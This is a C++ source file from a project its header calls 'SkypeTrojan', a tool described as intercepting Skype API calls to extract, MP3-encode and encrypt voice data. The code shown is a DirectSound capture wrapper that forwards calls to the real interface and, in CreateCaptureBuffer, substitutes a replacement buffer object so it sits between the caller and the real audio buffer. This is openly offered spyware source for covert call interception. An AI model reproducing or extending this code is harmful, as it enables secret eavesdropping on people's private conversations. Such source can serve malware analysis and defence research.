/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



/*
 * Tool name   : SkypeTrojan
 * Description : Tool to intercept Skype API calls and to extract voice data.
 *               The extracted data will be converted to MP3 and encrypted.
 * Version     : 
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */







#include <stdio.h>
#include <windows.h>
#include <DSound.h>
#include "IDirectSoundCaptureReplacement.h"
#include "IDirectSoundCaptureBufferReplacement.h"






/*
 * Constructors and destructor.
 *
 */

IDirectSoundCaptureReplacement::IDirectSoundCaptureReplacement(IDirectSoundCapture *pIDirectSoundCaptureOriginal)
{
  mIDirectSoundCaptureOriginal = pIDirectSoundCaptureOriginal;
}


IDirectSoundCaptureReplacement::IDirectSoundCaptureReplacement()
{
}

IDirectSoundCaptureReplacement::~IDirectSoundCaptureReplacement()
{
  if (mIDirectSoundCaptureOriginal)
    mIDirectSoundCaptureOriginal->~IDirectSoundCapture();
}








/*
 * Increment the reference counter
 *
 */

ULONG __stdcall IDirectSoundCaptureReplacement::AddRef()
{
  ULONG mRetVal = 0;

  if (mIDirectSoundCaptureOriginal)
    mRetVal = mIDirectSoundCaptureOriginal->AddRef();
  
  return(mRetVal);
}



/*
 * Decrement the reference counter
 *
 */

ULONG __stdcall IDirectSoundCaptureReplacement::Release()
{
  ULONG mRetVal = 0;

  if (mIDirectSoundCaptureOriginal)
    mRetVal = mIDirectSoundCaptureOriginal->Release();

  return(mRetVal);
}



/*
 * Query the DS instance
 *
 */

HRESULT __stdcall IDirectSoundCaptureReplacement::QueryInterface(REFIID iid, void** ppv)
{
  HRESULT mRetVal = 0;


  if (mIDirectSoundCaptureOriginal)
    mRetVal = mIDirectSoundCaptureOriginal->QueryInterface(iid, ppv);

  return(mRetVal);
}





/*
 * Create a sound capturing buffer
 *
 */

HRESULT __stdcall IDirectSoundCaptureReplacement::CreateCaptureBuffer(LPCDSCBUFFERDESC pcDSCBufferDesc, LPDIRECTSOUNDCAPTUREBUFFER * ppDSCBuffer, LPUNKNOWN pUnkOuter)
{
  long mRetVal = 0;

  if (mIDirectSoundCaptureOriginal)
    mRetVal = mIDirectSoundCaptureOriginal->CreateCaptureBuffer(pcDSCBufferDesc, ppDSCBuffer, pUnkOuter);

  /*
   * Sit in between the caller and the real destination object (callee)
   *
   */

  *ppDSCBuffer = new IDirectSoundCaptureBufferReplacement(*ppDSCBuffer, pcDSCBufferDesc->dwBufferBytes);

  return(mRetVal);
}





/*
 * Get current caps settings
 *
 */

HRESULT __stdcall IDirectSoundCaptureReplacement::GetCaps(LPDSCCAPS pDSCCaps)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundCaptureOriginal)
    mRetVal = mIDirectSoundCaptureOriginal->GetCaps(pDSCCaps);

  return(mRetVal);
}



/*
 * Initialize DS interface
 *
 */

HRESULT __stdcall IDirectSoundCaptureReplacement::Initialize(LPCGUID pcGuidDevice)
{
  HRESULT mRetVal = ERROR_SUCCESS; //0;

  if (mIDirectSoundCaptureOriginal)
    mRetVal = mIDirectSoundCaptureOriginal->Initialize(pcGuidDevice);

  return(mRetVal);
}
